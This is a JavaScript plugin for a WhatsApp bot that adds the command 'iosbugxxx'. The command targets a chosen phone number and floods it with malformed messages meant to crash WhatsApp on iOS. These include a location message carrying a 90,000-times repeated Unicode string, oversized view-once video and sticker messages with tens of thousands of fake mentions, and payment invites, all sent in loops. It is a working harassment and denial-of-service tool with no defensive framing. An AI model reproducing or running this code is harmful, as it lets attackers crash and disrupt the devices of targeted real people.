let handler = async (m, { conn, text }) => {
  const targetId = text
    ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
    : m.sender;

  const doneios = `
*\`ᥬ𝐄͢𝐱͠𝐞𝐜͜͡𝐮͢𝐭𝐢𝐯͜͡𝐞 𝐏͢𝐡͠𝐨𝐧͜𝐢𝐱 𝐁͢𝐮͜͡𝐠\`*🩸🐍
⿻ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${targetId}
⿻ 𝗧𝘆𝗽𝗲 : Crash WhatsApp iOS
⿻ 𝗦𝘁𝗮𝘁𝘂𝘀 : Successfully
  `.trim();

  try {
    await conn.sendMessage(m.chat, {
      image: { url: 'https://files.catbox.moe/w1isit.jpg' },
      caption: doneios,
      footer: '𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘢𝘶𝘴𝘦 𝘧𝘰𝘳 5 𝘮𝘪𝘯 𝘴𝘰 𝘣𝘰𝘵 𝘪𝘴 𝘯𝘰𝘵 𝘣𝘢𝘯𝘯𝘦𝘥',
      buttons: [
        {
          buttonId: '#',
          buttonText: { displayText: '⟅ ▿ ⿻ 𝐏‌‌𝐇𝚯‌𝐍‌𝐈𝐗‌ ϟ 𝚫‌𝐆‌𝐄‌‌𝐍‌𝐂𝐘‌ ⿻ ▿ ⟆' },
          type: 1
        }
      ],
      headerType: 4,
      viewOnce: true
    });

    for (let i = 0; i < 25; i++) {
      await ios1(targetId, conn);
      await ios2(targetId, conn);
    }

    for (let i = 0; i < 25; i++) {
      await protocolbug3(targetId, conn);
      await bulldozer(targetId, conn);
    }

  } catch (e) {
    console.error(e);
    m.reply('𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🎗');
  }
};

handler.command = ["iosbugxxx"];
handler.premium = false;
export default handler;

// === Funciones actualizadas ===

async function ios1(target, conn) {
  const crashText = "𑇂𑆵𑆴𑆿".repeat(90000);
  await conn.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 999.99999999999999,
        degreesLongitude: -999.99999999999999,
        name: crashText,
        url: "https://youtube.com/@raldzzoffc",
      },
    },
    {}
  );
}

async function ios2(target, conn) {
  await conn.relayMessage(target, {
    paymentInviteMessage: {
      serviceType: "CASHAPP",
      expiryTimestamp: Date.now() + 1814400000
    }
  }, {});
}

async function protocolbug3(target, conn) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc",
          mimetype: "video/mp4",
          fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
          fileLength: "109951162777600",
          seconds: 999999,
          mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
          caption: "\u9999",
          height: 999999,
          width: 999999,
          fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
          directPath: "/v/t62.7161-24/35743375.enc",
          mediaKeyTimestamp: "1743742853",
          contextInfo: {
            isSampled: true,
            mentionedJid: [
              ...Array.from({ length: 30000 }, () =>
                `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
              )
            ]
          },
        }
      }
    }
  }, {});

  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
  });
}

async function bulldozer(target, conn) {
  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath: "/v/t62.7161-24/10000000.enc",
          fileLength: { low: 1, high: 99999, unsigned: true },
          mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
          firstFrameLength: 19904,
          contextInfo: {
            mentionedJid: Array.from({ length: 20000 }, () =>
              "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
            ),
          },
          stickerSentTs: { low: -1939477883, high: 406, unsigned: false },
        }
      }
    }
  }, {});

  await conn.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
  });
}